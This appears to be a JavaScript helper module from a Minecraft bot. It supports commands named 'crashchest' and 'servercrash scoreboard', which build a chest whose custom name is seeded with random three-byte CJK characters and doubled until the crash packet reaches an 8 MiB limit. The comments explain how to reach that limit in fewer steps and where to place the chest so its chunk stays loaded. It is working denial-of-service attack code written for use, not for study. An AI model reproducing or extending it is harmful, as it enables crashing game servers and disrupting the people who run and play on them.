'use strict';

// Shared by the two crash commands: `crashchest` builds the block, and
// `servercrash scoreboard` points a sidebar display name at it.
const COMMAND_LIMIT = 32000;

// The chest's CustomName is seeded in one command, then doubled by appending it
// to itself. Every ideograph is three bytes in UTF-8, so the same command
// length carries three times the bytes an ASCII filler would: the crash packet
// reaches its 8 MiB ceiling with fewer doublings, which is fewer ticks spent
// waiting for the block entity to grow.
const SEED_LENGTH = 30000;
const BYTES_PER_CHAR = 3;
const CJK_FIRST = 0x4e00;
const CJK_LAST = 0x9fff;

function chineseSeed(length = SEED_LENGTH) {
    const span = CJK_LAST - CJK_FIRST + 1;
    let out = '';
    for (let i = 0; i < length; i++) {
        out += String.fromCharCode(CJK_FIRST + Math.floor(Math.random() * span));
    }
    return out;
}

// Directly above the core's own area: that chunk is loaded because the core
// works in it, and the spot is clear of the blocks the core runs commands in.
function chestPosition(bot) {
    const core = bot?.core;
    if (core?.origin && core.origin.x !== null && Number.isFinite(core.size)) {
        return { x: core.origin.x, y: core.origin.y + core.size, z: core.origin.z };
    }
    const position = bot?.position;
    if (position && Number.isFinite(position.x) && Number.isFinite(position.y) && Number.isFinite(position.z)) {
        return { x: Math.floor(position.x), y: Math.floor(position.y) + 2, z: Math.floor(position.z) };
    }
    return null;
}

module.exports = { chineseSeed, chestPosition, SEED_LENGTH, BYTES_PER_CHAR, COMMAND_LIMIT };
